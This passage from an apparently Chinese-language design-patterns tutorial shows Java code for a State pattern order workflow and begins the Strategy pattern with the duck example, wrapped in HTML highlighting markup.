class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">//环境上下文</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Context</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span>&#123;<br>   <span class="hljs-comment">//当前的状态 state, 根据我们的业务流程处理，不停的变化</span><br>   <span class="hljs-keyword">private</span> State state;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.checkEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkFailEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.checkFailEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makePriceEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.makePriceEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acceptOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.acceptOrderEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notPeopleAcceptEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.notPeopleAcceptEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.payOrderEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">orderFailureEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.orderFailureEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.feedBackEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> state;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(State state)</span> &#123;<br>        <span class="hljs-built_in">this</span>.state = state;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;当前状态 : &quot;</span> + state.getCurrentState());<br>        <span class="hljs-keyword">return</span> state.getCurrentState();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>State.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 状态接口</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">State</span> &#123;<br><br>   <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 电审</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 电审失败</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkFailEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 定价发布</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">makePriceEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 接单</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">acceptOrderEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 无人接单失效</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">notPeopleAcceptEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 付款</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrderEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 接单有人支付失效</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">orderFailureEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 反馈</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span>;<br><br><br>    String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>StateEnum.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 状态枚举类</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">StateEnum</span> &#123;<br><br>    <span class="hljs-comment">//订单生成</span><br>    GENERATE(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;GENERATE&quot;</span>),<br><br>    <span class="hljs-comment">//已审核</span><br>    REVIEWED(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;REVIEWED&quot;</span>),<br><br>    <span class="hljs-comment">//已发布</span><br>    PUBLISHED(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;PUBLISHED&quot;</span>),<br><br>    <span class="hljs-comment">//待付款</span><br>    NOT_PAY(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;NOT_PAY&quot;</span>),<br><br>    <span class="hljs-comment">//已付款</span><br>    PAID(<span class="hljs-number">5</span>, <span class="hljs-string">&quot;PAID&quot;</span>),<br><br>    <span class="hljs-comment">//已完结</span><br>    FEED_BACKED(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;FEED_BACKED&quot;</span>);<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> key;<br>    <span class="hljs-keyword">private</span> String value;<br><br>    StateEnum(<span class="hljs-type">int</span> key, String value) &#123;<br>        <span class="hljs-built_in">this</span>.key = key;<br>        <span class="hljs-built_in">this</span>.value = value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<span class="hljs-keyword">return</span> key;&#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<span class="hljs-keyword">return</span> value;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">当前状态 : <span class="hljs-type">PUBLISHED</span><br>PUBLISHED<br>当前状态 : <span class="hljs-type">NOT_PAY</span><br>当前状态 : <span class="hljs-type">PAID</span><br></code></pre></td></tr></table></figure><h2 id="状态模式的注意事项和细节"><a class="markdownIt-Anchor" href="#状态模式的注意事项和细节"></a> 状态模式的注意事项和细节</h2><ol><li><p>代码有很强的<strong>可读性</strong>。状态模式将每个状态的行为封装到对应的一个类中</p></li><li><p><strong>方便维护</strong>。将容易产生问题的 if-else 语句删除了，如果把每个状态的行为都放到一个类中，每次调用方法时都要判断当前是什么状态，不但会产出很多 if-else 语句，而且容易出错</p></li><li><p>符合“开闭原则”。容易增删状态</p></li><li><p>会产生很多类。每个状态都要一个对应的类，当状态过多时会产生很多类，加大维护难度</p></li><li><p>应用场景：当一个事件或者对象有很多种状态，状态之间会相互转换，对不同的状态要求有不同的行为的时候，可以考虑使用状态模式</p></li></ol><h1 id="策略模式"><a class="markdownIt-Anchor" href="#策略模式"></a> <mark>策略模式</mark></h1><p>在策略模式（Strategy Pattern）中，一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于行为型模式。</p><h2 id="介绍-21"><a class="markdownIt-Anchor" href="#介绍-21"></a> 介绍</h2><p><strong>意图：</strong> 定义一系列的算法,把它们一个个封装起来, 并且使它们可相互替换。</p><p><strong>主要解决：</strong> 在有多种算法相似的情况下，使用 if…else 所带来的复杂和难以维护。</p><p><strong>何时使用：</strong> 一个系统有许多许多类，而区分它们的只是他们直接的行为。</p><p><strong>如何解决：</strong> 将这些算法封装成一个一个的类，任意地替换。</p><p><strong>关键代码：</strong> 实现同一个接口。</p><p><strong>应用实例：</strong> 1、诸葛亮的锦囊妙计，每一个锦囊就是一个策略。 2、旅行的出游方式，选择骑自行车、坐汽车，每一种旅行方式都是一个策略。 3、JAVA AWT 中的 LayoutManager。</p><p><strong>优点：</strong> 1、算法可以自由切换。 2、避免使用多重条件判断。 3、扩展性良好。</p><p><strong>缺点：</strong> 1、策略类会增多。 2、所有策略类都需要对外暴露。</p><p><strong>使用场景：</strong> 1、如果在一个系统里面有许多类，它们之间的区别仅在于它们的行为，那么使用策略模式可以动态地让一个对象在许多行为中选择一种行为。<br />2、一个系统需要动态地在几种算法中选择一种。 3、如果一个对象有很多的行为，如果不用恰当的模式，这些行为就只好使用多重的条件选择语句来实现。</p><p><strong>注意事项：</strong> 如果一个系统的策略多于四个，就需要考虑使用混合模式，解决策略类膨胀的问题。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105165911040.png" alt="image-20230105165911040" /></p><p>从上图可以看到，客户 context 有成员变量 strategy 或者其他的策略接口,至于需要使用到哪个策略，我们可以在构造器中指定</p><h2 id="实现-19"><a class="markdownIt-Anchor" href="#实现-19"></a> 实现</h2><ol><li>应用实例要求</li></ol><p>​1) 有各种鸭子(比如 野鸭、北京鸭、水鸭等， 鸭子有各种行为，比如 叫、飞行等)</p><p>​2) 显示鸭子的信息</p><p>编写程序完成前面的鸭子项目，要求使用策略模式</p><ol start="2"><li>思路分析(类图)</li></ol><p>策略模式：分别封装行为接口，实现算法族，超类里放行为接口对象，在子类里具体设定行为对象。原则就是：分离变化部分，封装接口，基于接口编程各种功能。此模式让行为的变化独立于算法的使用者</p><p>传统模式类图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105170757994.png" alt="image-20230105170757994" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br><span class="hljs-comment">//测试</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">PekingDuck</span>().fly();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">WildDuck</span>().fly();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ToyDuck</span>().fly();<br><span class="hljs-comment">//ToyDuck没有飞行能力</span><br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>Duck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Duck</span><span class="hljs-params">()</span> &#123;<br>   <br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>;<span class="hljs-comment">//显示鸭子信息</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;鸭子嘎嘎叫~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;鸭子会游泳~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;鸭子会飞翔~~~&quot;</span>);<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>PekingDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PekingDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;~~北京鸭~~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//因为北京鸭不能飞翔，因此需要重写fly</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;北京鸭不能飞翔&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ToyDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToyDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span>&#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;玩具鸭&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">//需要重写父类的所有方法</span><br>   <br>   <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;玩具鸭不能叫~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;玩具鸭不会游泳~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;玩具鸭不会飞翔~~~&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>WildDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WildDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 这是野鸭 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">北京鸭不能飞翔<br>鸭子会飞翔<span class="hljs-code">~~~</span><br><span class="hljs-code">玩具鸭不会飞翔~~~</span><br></code></pre></td></tr></table></figure><p>策略模式类图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105165733894.png" alt="" /></p><p><code>BadFlyBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadFlyBehavior</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlyBehavior</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 飞翔技术一般 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">WildDuck</span> <span class="hljs-variable">wildDuck</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WildDuck</span>();<br>      wildDuck.fly();<span class="hljs-comment">//</span><br>      <br>      <span class="hljs-type">ToyDuck</span> <span class="hljs-variable">toyDuck</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToyDuck</span>();<br>      toyDuck.fly();<br>      <br>      <span class="hljs-type">PekingDuck</span> <span class="hljs-variable">pekingDuck</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PekingDuck</span>();<br>      pekingDuck.fly();<br>      <br>      <span class="hljs-comment">//动态改变某个对象的行为, 北京鸭 不能飞</span><br>      pekingDuck.setFlyBehavior(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NoFlyBehavior</span>());<br>      System.out.println(<span class="hljs-string">&quot;北京鸭的实际飞翔能力&quot;</span>);<br>      pekingDuck.fly();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Duck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>    <span class="hljs-comment">//属性, 策略接口</span><br>    FlyBehavior flyBehavior;<br>    <span class="hljs-comment">//其它属性&lt;-&gt;策略接口</span><br>    QuackBehavior quackBehavior;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Duck</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>;<span class="hljs-comment">//显示鸭子信息</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;鸭子嘎嘎叫~~&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;鸭子会游泳~~&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br><br>      display();<br>        <span class="hljs-comment">//改进</span><br>        <span class="hljs-keyword">if</span> (flyBehavior != <span class="hljs-literal">null</span>) &#123;<br>            flyBehavior.fly();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFlyBehavior</span><span class="hljs-params">(FlyBehavior flyBehavior)</span> &#123;<br>        <span class="hljs-built_in">this</span>.flyBehavior = flyBehavior;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setQuackBehavior</span><span class="hljs-params">(QuackBehavior quackBehavior)</span> &#123;<br>        <span class="hljs-built_in">this</span>.quackBehavior = quackBehavior;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>FlyBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 